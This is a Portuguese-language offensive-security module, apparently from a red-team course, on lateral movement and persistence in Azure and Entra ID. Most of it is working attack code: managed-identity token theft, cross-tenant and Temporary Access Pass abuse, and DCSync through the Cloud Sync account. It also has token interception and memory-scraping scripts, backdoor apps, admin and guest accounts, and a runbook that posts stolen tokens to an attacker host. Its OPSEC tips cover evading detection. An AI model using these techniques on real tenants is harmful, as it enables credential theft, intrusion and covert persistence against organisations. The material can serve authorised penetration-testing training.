---
title: "Azure Lateral Movement"
---

# Movimentação Lateral e Persistência no Azure

## Lateral Movement é Entre Identidades, Não Máquinas

No Azure, movimentação lateral não é entre máquinas via SMB — é entre **identidades**, **tenants**, **recursos** e ambientes **on-prem/cloud**. Atacante parte de usuário comum em um tenant e chega a Domain Admin em ambiente on-prem sincronizado, passando por managed identities, cross-tenant trusts, Cloud Sync e B2B collaboration. Persistência também difere do modelo clássico: em vez de criar serviço ou scheduled task, o atacante cria app registration com secret de longa duração, adiciona credencial a service principal existente, ou estabelece guest account difícil de detectar.

---

## Managed Identity Pivot — IMDS Token Theft

A técnica mais poderosa de movimentação lateral em recursos Azure. Se você comprometeu uma VM, Container, Function App, ou qualquer recurso com Managed Identity:

```bash
# Dentro da VM comprometida:

# Obter token para ARM (Azure Resource Manager)
curl -s -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | python3 -m json.tool

# Obter token para Microsoft Graph
curl -s -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" \
  | python3 -m json.tool

# Obter token para Key Vault
curl -s -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" \
  | python3 -m json.tool

# Obter token para Storage
curl -s -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" \
  | python3 -m json.tool

# Obter metadados da instância (informações sobre a VM)
curl -s -H "Metadata:true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
  | python3 -m json.tool

# PowerShell (dentro da VM Windows)
$response = Invoke-WebRequest -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -Headers @{Metadata="true"} -UseBasicParsing
$token = ($response.Content | ConvertFrom-Json).access_token
Write-Host "ARM Token: $token"
```

### O Que Fazer com o Token da Managed Identity

```bash
TOKEN="<arm_token_da_managed_identity>"

# 1. Descobrir quem sou (qual identidade)
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01" | python3 -m json.tool

# 2. Listar recursos acessíveis
az login --use-device-code
# OU usar o token diretamente:
az account get-access-token  # e substituir pelo IMDS token

# 3. Se tem permissões em Key Vault: extrair secrets
VAULT_TOKEN=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")

curl -s -H "Authorization: Bearer $VAULT_TOKEN" \
  "https://myvault.vault.azure.net/secrets?api-version=7.4"

# 4. Se tem acesso a Storage: baixar dados
curl -s -H "Authorization: Bearer $STORAGE_TOKEN" \
  -H "x-ms-version: 2020-04-08" \
  "https://mystorageaccount.blob.core.windows.net/mycontainer?restype=container&comp=list"
```

---

## Cross-Tenant Lateral Movement

### B2B Collaboration (Guest Accounts)

O B2B permite que usuários externos (guests) acessem recursos de outro tenant. Se comprometemos um usuário que é guest em múltiplos tenants, podemos acessar todos eles.

```powershell
# Enumerar tenants onde o usuário tem acesso (como guest)
# Via OIDC discovery — cada tenant onde o usuário é guest
$userToken = "<access_token>"
$headers = @{ Authorization = "Bearer $userToken" }

# Listar organizações do usuário
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/transitiveMemberOf" -Headers $headers

# Para trocar de tenant: usar refresh token + tenant específico
$body = @{
    grant_type    = "refresh_token"
    refresh_token = "<refresh_token>"
    client_id     = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"  # Az CLI
    scope         = "https://management.azure.com/.default offline_access"
    tenant        = "<tenant_id_do_outro_tenant>"  # Tenant alvo
}

$result = Invoke-RestMethod -Method Post `
    -Uri "https://login.microsoftonline.com/<tenant_alvo>/oauth2/v2.0/token" `
    -Body $body -ContentType "application/x-www-form-urlencoded"
```

### Cross-Tenant Access Settings Abuse

Quando dois tenants configuram "Automatic Redemption" nas configurações de acesso entre tenants, o consentimento de B2B é suprimido — o usuário pode acessar o outro tenant sem a tela de consentimento.

**Cenário de Abuso (do CARTE)**:
- Oil Corp (tenant A) → Oil Corp Geology (tenant B): automatic redemption configurada.
- Usuários do SyncGroup do Oil Corp são sincronizados para o Geology tenant.
- Se comprometemos um usuário do SyncGroup no Oil Corp, podemos acessar o Geology tenant transparentemente.

```powershell
# Enumerar configurações de cross-tenant access
$headers = @{ Authorization = "Bearer $graphToken" }

# Default settings
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/policies/crossTenantAccessPolicy/default" -Headers $headers

# Organizational settings (tenant específico)
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/policies/crossTenantAccessPolicy/partners" -Headers $headers

# Cross-tenant sync (quais grupos são sincronizados)
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/servicePrincipals?$filter=tags/any(t:t eq 'WindowsAzureActiveDirectoryIntegratedApp')" -Headers $headers
```

### Temporary Access Pass (TAP) para Lateral Movement Cross-Tenant

Se comprometemos um usuário com role que pode criar TAPs (`UserAuthenticationMethod.ReadWrite.All`, `Authentication Administrator`, etc.):

```powershell
# Criar TAP para um usuário sincronizado cross-tenant
# (O TAP funciona em qualquer tenant onde o usuário tem acesso — "Works across tenants")

$userId = "user-objectid-no-tenant-origem"

$tapBody = @{
    startDateTime   = (Get-Date).ToUniversalTime().ToString("o")
    lifetimeInMinutes = 30
    isUsableOnce    = $false
} | ConvertTo-Json

Invoke-RestMethod -Method POST `
    -Uri "https://graph.microsoft.com/v1.0/users/$userId/authentication/temporaryAccessPassMethods" `
    -Headers @{ Authorization = "Bearer $graphToken"; "Content-Type" = "application/json" } `
    -Body $tapBody

# O TAP gerado permite login SEM SENHA e satisfaz MFA em CAPs
# Válido por 30 minutos, mas o access token ARM tem validade de 70-75 minutos!
```

---

## Hybrid Identity — Cloud para On-Premises

### Microsoft Entra Cloud Sync (Pivô Cloud → On-Prem)

O Cloud Sync é uma alternativa ao Azure AD Connect que usa um agente lightweight para sincronizar usuários entre on-prem AD e Entra ID.

**Arquitetura**:
```
[On-Prem Active Directory]
         ↑↓ (LDAP queries)
[Provisioning Agent (pGMSA)]
         ↑↓ (SCIM via Azure Service Bus)
[Entra ID Provisioning Service]
         ↑↓ (Graph API)
[Microsoft Entra ID]
```

**Conta crítica**: O agente roda como uma GMSA (Group Managed Service Account) chamada `pGMSA_<installationID>`.

Se **Password Hash Sync** está habilitado:
- A `pGMSA` tem **direitos de replicação (DCSync)** na floresta sincronizada.
- Extraindo as credenciais da `pGMSA`, é possível executar DCSync e obter hashes de todos os usuários do domínio.

```powershell
# Identificar se Cloud Sync está configurado no tenant
$headers = @{ Authorization = "Bearer $graphToken" }
Invoke-RestMethod -Uri "https://graph.microsoft.com/beta/directory/provisioningPolicies" -Headers $headers

# Identificar a conta de sincronização (ADToAADSyncServiceAccount)
Get-MgUser -Filter "startsWith(userPrincipalName,'ADToAADSyncServiceAccount')" -All

# No servidor on-prem com o agente instalado:
# Extrair credenciais da pGMSA (requer SYSTEM ou DA local)
# Ferramenta: AADInternals
Import-Module AADInternals
Get-AADIntSyncCredentials  # Extrai credenciais do agente

# Com credenciais da pGMSA: executar DCSync
Import-Module Mimikatz
lsadump::dcsync /domain:corp.local /all /csv
```

### Password Write-Back Abuse (Cloud → On-Prem)

Se Cloud Sync tem **Password Write-Back** habilitado, um usuário com role `User Administrator` no Entra ID pode resetar a senha de usuários sincronizados — e essa senha se propaga para o AD on-prem.

```powershell
# Se temos User Administrator no Entra ID e o usuário alvo é sincronizado:
Update-MgUserPassword -UserId "synced-user-objectid" -NewPassword "Hack3d!2024"

# A senha é escrita de volta no AD on-prem
# Se o usuário syncado tem permissões interessantes no AD (ex: Domain Admin)
# → temos Domain Admin via Cloud!

# Verificar se usuário é sincronizado:
Get-MgUser -UserId "user-objectid" | Select-Object OnPremisesSyncEnabled, OnPremisesSamAccountName

# Encontrar grupo com User Administrator que pode fazer write-back
# (No CARTE: grupo "OU Admins Sync" tem User Administrator role)
Get-MgGroupMember -GroupId "group-id" -All
```

---

## Token Extraction e Replay

### Tokens Cached pelo Windows (TokenBroker)

```powershell
# Localização dos tokens cacheados por aplicações Office
# %LOCALAPPDATA%\Microsoft\TokenBroker\Cache\*.TBRES
# Criptografados com DPAPI (chave do usuário)

# Ferramenta WAMBam para descriptografar (github.com/xpn/WAMBam)
.\WAMBam.exe  # Automaticamente descriptografa e exibe tokens

# Manual via PowerShell (requer contexto do usuário)
$cachePath = "$env:LOCALAPPDATA\Microsoft\TokenBroker\Cache"
Get-ChildItem $cachePath -Filter "*.TBRES" | ForEach-Object {
    # Usar DPAPI para descriptografar
    [System.Security.Cryptography.ProtectedData]::Unprotect(
        [IO.File]::ReadAllBytes($_.FullName),
        $null,
        [System.Security.Cryptography.DataProtectionScope]::CurrentUser
    )
}
```

### AiTM — Token Extraction via SSL Interception

```bash
# Usando mitmdump para interceptar SSL/TLS
pip install mitmproxy

# Configurar proxy no sistema alvo
export https_proxy="http://attacker:8080"

# Capturar tokens em trânsito (Graph API, ARM, etc.)
mitmdump -w captured_traffic.mitm --flow-detail 3 \
    -s intercept_tokens.py  # script Python para filtrar JWTs

# Script intercept_tokens.py
import re
import base64
import json
from mitmproxy import http

def response(flow: http.HTTPFlow) -> None:
    content = flow.response.get_text()
    if "access_token" in content:
        try:
            data = json.loads(content)
            token = data.get("access_token", "")
            if token:
                print(f"[+] ACCESS TOKEN: {token[:50]}...")
                with open("stolen_tokens.txt", "a") as f:
                    f.write(f"{token}\n")
        except:
            pass
```

### Memory Scraping (Office 365 Apps)

```powershell
# Usar Procdump para dump de memória de processo Office
# (Requer acesso ao processo, geralmente requer SYSTEM ou usuário logado)

# Dump de processo do Outlook
.\procdump.exe -ma <outlook_pid> outlook.dmp

# Analisar dump para encontrar JWTs (começam com "eyJ")
$content = [System.IO.File]::ReadAllText("outlook.dmp")
$pattern = 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
$tokens = [regex]::Matches($content, $pattern) | Select-Object -ExpandProperty Value -Unique

$tokens | ForEach-Object {
    $parts = $_ -split '\.'
    $payload = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($parts[1] + "=="))
    $claims = $payload | ConvertFrom-Json
    Write-Host "Token encontrado! aud=$($claims.aud) exp=$($claims.exp) upn=$($claims.upn)"
}
```

---

## Persistência no Azure

### 1. App Registration com Secret/Certificado

```powershell
# Criar nova App Registration "silenciosa"
$app = New-MgApplication -DisplayName "MicrosoftBackupService" -SignInAudience "AzureADMyOrg"
$sp  = New-MgServicePrincipal -AppId $app.AppId

# Adicionar secret (válido por 2 anos)
$cred = Add-MgApplicationPassword -ApplicationId $app.Id -PasswordCredential @{
    DisplayName = "prod-key-2024"
    EndDateTime  = (Get-Date).AddYears(2)
}

Write-Host "ClientId: $($app.AppId)"
Write-Host "Secret: $($cred.SecretText)"
Write-Host "TenantId: $(Get-MgContext | Select-Object -ExpandProperty TenantId)"

# Adicionar permissões elevadas ao SP (requer admin consent)
# Graph: Mail.Read.All
$graphSpId = (Get-MgServicePrincipal -Filter "appId eq '00000003-0000-0000-c000-000000000000'").Id
$mailRole   = (Get-MgServicePrincipal -Filter "appId eq '00000003-0000-0000-c000-000000000000'").AppRoles |
              Where-Object { $_.Value -eq "Mail.Read" }

New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $sp.Id `
    -PrincipalId $sp.Id `
    -ResourceId $graphSpId `
    -AppRoleId $mailRole.Id
```

### 2. Adicionar Global Admin

```powershell
# Requere Global Administrator ou Privileged Role Administrator
$globalAdminRoleId = "62e90394-69f5-4237-9190-012177145e10"

# Obter o ID do role
$role = Get-MgDirectoryRole -Filter "roleTemplateId eq '$globalAdminRoleId'"

# Adicionar usuário como Global Admin
New-MgDirectoryRoleMember -DirectoryRoleId $role.Id -BodyParameter @{
    "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/<user-objectid>"
}
```

### 3. Criar Guest User (B2B Backdoor)

```powershell
# Convidar usuário externo como guest
New-MgInvitation -InvitedUserEmailAddress "attacker@attacker.com" `
    -InviteRedirectUrl "https://portal.azure.com" `
    -SendInvitationMessage:$false

# O guest user agora existe no tenant
# Atribuir role ao guest
New-MgDirectoryRoleMember -DirectoryRoleId $role.Id -BodyParameter @{
    "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/<guest-objectid>"
}
```

### 4. Azure Automation Account — Runbook Backdoor

```powershell
# Criar runbook malicioso em conta de automação existente
$runbookContent = @'
# Runbook que exfiltra tokens via managed identity
$response = Invoke-WebRequest -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" -Headers @{Metadata="true"}
$token = ($response.Content | ConvertFrom-Json).access_token
# Enviar para attacker C2
Invoke-RestMethod -Uri "https://attacker.com/tokens" -Method POST -Body @{ token = $token }
'@

# Importar o runbook
az automation runbook create \
    --automation-account-name "AutomationAccount" \
    --resource-group "RG" \
    --name "SystemHealthCheck" \
    --type PowerShell \
    --content "$runbookContent"

# Publicar e agendar
az automation runbook publish --automation-account-name "AutomationAccount" --resource-group "RG" --name "SystemHealthCheck"
az automation schedule create --automation-account-name "AutomationAccount" --resource-group "RG" --name "DailyRun" --frequency Day --interval 1
az automation runbook job-schedule link --automation-account-name "AutomationAccount" --resource-group "RG" --runbook-name "SystemHealthCheck" --schedule-name "DailyRun"
```

### 5. Registrar Novo Device (PRT-based Persistence)

```powershell
# Usando AADInternals para registrar dispositivo e obter PRT
Import-Module AADInternals

# Com token válido: registrar dispositivo
$at = Get-AADIntAccessTokenForAADGraph -Credentials (Get-Credential)
Join-AADIntDeviceToAzureAD -AccessToken $at -DeviceName "LEGITIMATE-WS01" -DeviceType "Windows" -OSVersion "10.0.19041"

# O device registrado tem um PRT (Primary Refresh Token)
# O PRT pode ser usado para autenticar mesmo após reset de senha do usuário
```

---

## Azure ARC — Lateral Movement On-Prem → Cloud

Azure ARC permite gerenciar servidores on-premises via Azure. Se um servidor on-prem tem o agente ARC instalado:

```bash
# Dentro de um servidor on-prem com ARC agent:
# O agente tem managed identity no Azure

# Verificar se é ARC-enabled
ls /var/opt/azcmagent/  # Linux
# ou C:\Program Files\AzureConnectedMachineAgent\ # Windows

# O agente cria um managed identity local
# Tokens disponíveis via endpoint local do agente
curl -s -H "Metadata:true" \
  "http://127.0.0.1:40342/metadata/identity/oauth2/token?api-version=2019-11-01&resource=https://management.azure.com/"
```

---

## Detecção e OPSEC

### Atividades de Alto Risco que Geram Alertas

| Ação | Log Gerado | Nível de Alerta |
|------|-----------|----------------|
| New-MgApplication | Audit: "Add application" | Médio |
| Add-MgApplicationPassword | Audit: "Add service principal credentials" | ALTO |
| New-MgDirectoryRoleMember (Global Admin) | Audit: "Add member to role" | CRÍTICO |
| New-MgInvitation (Guest) | Audit: "Invite external user" | Médio |
| IMDS token request | Não logado diretamente | Nenhum |
| Password write-back | AD Event Log 4723 (senha alterada) | Médio |
| Cloud Sync DCSync (pGMSA) | AD Event ID 4662 (replicação) | ALTO |
| TAP creation | Audit: "Create Temporary Access Pass" | Médio |

### Boas Práticas de OPSEC

1. **Use nomes plausíveis** para apps criadas como backdoor (ex: "MicrosoftBackupAgent", "AzureMonitorPlugin").
2. **Prefira certificados a secrets** para apps backdoor — expiram mais tarde e são menos monitorados.
3. **Guest users** são menos visíveis que novos usuários internos — use conta de domínio legítimo de parente.
4. **IMDS** não gera logs — o mais silencioso método de pivot.
5. **Nunca ative PIM** de contas de alto valor a menos que tenha plano de ação imediato — gera notificações.

---

## Módulos Relacionados

`13_azure_acesso_inicial.md` cobre obtenção de tokens iniciais. `14_azure_enum_privesc.md` é o pré-requisito de enumeração e escalada. `16_azure_bypass_defesas.md` aprofunda bypass pra manter acesso. `17_azure_cicd_abuse.md` cobre GitHub Actions como vetor de persistência. `18_azure_cheatsheet.md` traz comandos quick-reference.
